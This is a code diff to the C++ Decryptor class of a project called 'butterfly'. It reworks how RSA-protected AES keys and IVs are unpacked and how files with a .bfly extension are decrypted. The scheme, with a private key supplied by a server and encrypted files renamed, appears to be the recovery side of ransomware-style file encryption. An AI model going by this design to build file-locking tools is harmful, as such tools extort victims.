@@ -9,17 +9,9 @@ namespace butterfly
 namespace hybrid
 {
 
-Decryptor::Decryptor(const std::string &aesKeyDbFilepath) : _aesKeyDbFilepath(aesKeyDbFilepath), _aesDecryptor(new aes::AESDecryptor())
+Decryptor::Decryptor(const std::string &aesKeyDBPath) : _aesKeyDBPath(aesKeyDBPath), _aesDecryptor(new aes::AESDecryptor())
 {
     LOG_TRACE("Create class Decryptor");
-}
-
-void Decryptor::removeBFLYEnding(std::string &filepath)
-{
-    if (filepath.find(butterfly::ENC_BFLY_FILE_ENDING) != std::string::npos)
-    {
-        filepath.erase(filepath.length() - butterfly::ENC_BFLY_FILE_ENDING.length());
-    }
 }
 
 void Decryptor::removeDecryptedFiles()
@@ -27,7 +19,6 @@ void Decryptor::removeDecryptedFiles()
 
     butterfly::removeFile(butterfly::ENC_CPRIVATERSA_FILENAME);
     butterfly::removeFile(butterfly::ENC_AESKEY_FILENAME);
-    butterfly::removeFile(butterfly::ENC_AESIV_FILENAME);
     butterfly::removeFile(butterfly::RSA_EKIV_FILENAME);
 
 }
@@ -37,16 +28,23 @@ void Decryptor::invokeDir(const std::string &dirPath, const std::string &pkeyFro
     // Decrypt the CPrivateRSA.bin file
     decryptCPrivateRSA(pkeyFromServer, butterfly::ENC_CPRIVATERSA_FILENAME);
 
-    // Decrypt the AESKey.bin and AESIV.bin file
+    // Decrypt the AESKey.bin file and get AESKey and AESIV
     std::string aesk, aesiv;
-    decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, butterfly::ENC_AESIV_FILENAME, aesk, aesiv);
+    decryptAESKeyPair(butterfly::ENC_AESKEY_FILENAME, aesk, aesiv);
 
+    // Get all files from provided directory path
     auto files = DirectoryIterator::getAllFiles(dirPath);
+
+    // Iterate over all file paths
     for (auto &file: files)
     {
-        std::string filepath = file.string();
-        removeBFLYEnding(filepath);
-        decryptFileWithAES(filepath, aesk, aesiv);
+        // Check if the provided file path has the .bfly extension
+        if ( DirectoryIterator::getFileExtension(file) == butterfly::ENC_BFLY_FILE_ENDING )
+        {
+            std::string filepath = file.string();
+            decryptFileWithAES(filepath, aesk, aesiv);
+        }
+
     }
 
     removeDecryptedFiles();
@@ -57,12 +55,13 @@ void Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std:
 
     _rsaDecryptorCPrivateRSA = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(pkeyFromServer));
 
-    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->getBinKeyFileContents(encCPrivateRSAFile);
+    std::string encCPrivateRSA = _rsaDecryptorCPrivateRSA->readEncMSGFromFile(encCPrivateRSAFile);
     EVP_PKEY *CPrivateRSAPKey = _rsaDecryptorCPrivateRSA->getEvpPkey();
 
     try
     {
         _rsaDecryptorCPrivateRSA->decryptEVP(CPrivateRSAPKey, encCPrivateRSA, _decryptedCPrivateRSA, butterfly::RSAKEY_TYPE::CPRIVATE_RSA);
+        //_rsaDecryptorCPrivateRSA->decrypt(CPrivateRSAPKey, encCPrivateRSA, _decryptedCPrivateRSA);
         LOG_TRACE("Decrypted CPrivateRSA: " << _decryptedCPrivateRSA);
         //std::cout << "Decrypted CPrivateRSA: " << _decryptedCPrivateRSA << std::endl;
 
@@ -86,29 +85,37 @@ void Decryptor::decryptCPrivateRSA(const std::string &pkeyFromServer, const std:
 
 }
 
-void Decryptor::decryptAESKeyPair(const std::string &filepathAESKey, const std::string &filepathAESIV, std::string &decAESKey,  std::string &decAESIV)
+void Decryptor::decryptAESKeyPair(const std::string &filepathAESKey, std::string &decAESKey,  std::string &decAESIV)
 {
 
     std::unique_ptr<rsa::RSADecryptor> rsaDecryptorAESKey = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));
-    std::unique_ptr<rsa::RSADecryptor> rsaDecryptorAESIV  = std::unique_ptr<rsa::RSADecryptor>(new rsa::RSADecryptor(_decryptedCPrivateRSA));
 
-    std::string encAESKey = rsaDecryptorAESKey->getBinKeyFileContents(filepathAESKey);  // Length of encAESKey = 256
-    std::string encAESIV  = rsaDecryptorAESIV->getBinKeyFileContents(filepathAESIV);    // Length of encAESIV  = 256
+    std::string encAESKey = rsaDecryptorAESKey->readEncMSGFromFile(filepathAESKey);  // Length of encAESKey = encMSGLen in encrypt
 
+    std::string aeskeypair;
     try
     {
-        rsaDecryptorAESKey->decryptEVP(rsaDecryptorAESKey->getEvpPkey(), encAESKey, decAESKey, butterfly::RSAKEY_TYPE::AESKEY);
-        LOG_TRACE("Decrypted Content from file " << filepathAESKey << ": " << decAESKey);
-        //std::cout << "Decrypted Content from file " << filepathAESKey << ": " << decAESKey << std::endl;
-
-        rsaDecryptorAESIV->decryptEVP(rsaDecryptorAESIV->getEvpPkey(), encAESIV, decAESIV, butterfly::RSAKEY_TYPE::AESIV);
-        LOG_TRACE("Decrypted Content from file " << filepathAESIV << ": " << decAESIV);
-        //std::cout << "Decrypted Content from file " << filepathAESIV << ": " << decAESIV << std::endl;
+        rsaDecryptorAESKey->decryptEVP(rsaDecryptorAESKey->getEvpPkey(), encAESKey, aeskeypair, butterfly::RSAKEY_TYPE::AESKEY);
+        //rsaDecryptorAESKey->decrypt(rsaDecryptorAESKey->getEvpPkey(), encAESKey, aeskeypair);
+        LOG_TRACE("Decrypted Content from file " << filepathAESKey << ": " << aeskeypair << " with Length: " << aeskeypair.length());
+        //std::cout << "Decrypted Content from file " << filepathAESKey << ": " << aeskeypair << " with Length: " << aeskeypair.length() << std::endl;
 
     } catch (RSADecryptionException &e)
     {
         std::cerr << e.what() << std::endl;
         LOG_ERROR(e.what());
+    }
+
+    int aesKeyLength = _aesDecryptor->getAESKeyLength();
+    int aesIVLength = _aesDecryptor->getAESIVLength();
+
+    if ( static_cast<int>(aeskeypair.length()) < (aesKeyLength + aesIVLength) )
+    {
+        throw DecryptorException("AESKEYPairLength " + std::to_string(aeskeypair.length()) + " is less than " + std::to_string(aesKeyLength));
+    } else
+    {
+        decAESKey = aeskeypair.substr(0, static_cast<unsigned long>(aesKeyLength));
+        decAESIV  = aeskeypair.substr(static_cast<unsigned long>(aesKeyLength), static_cast<unsigned long>(aesIVLength));
     }
 
     // Check if string is empty
@@ -120,12 +127,12 @@ void Decryptor::decryptAESKeyPair(const std::string &filepathAESKey, const std::
     // Check if string is empty
     if ( decAESIV.empty() )
     {
-        throw DecryptorException("Decrypted " + filepathAESIV + " is empty!");
+        throw DecryptorException("Decrypted " + filepathAESKey + " is empty!");
     }
 
 }
 
-void Decryptor::decryptFileWithAES(const std::string &filepath, const std::string &aeskey, const std::string &aesiv)
+void Decryptor::decryptFileWithAES(const std::string &filepath, std::string &aeskey, std::string &aesiv)
 {
     // Set AESKey and AESIV
     _aesDecryptor->setAESKey(aeskey);
@@ -140,6 +147,7 @@ void Decryptor::decryptFileWithAES(const std::string &filepath, const std::strin
     {
         std::cerr << e.what() << std::endl;
         LOG_ERROR(e.what());
+        throw DecryptorException(e.what());
     }
 
 }
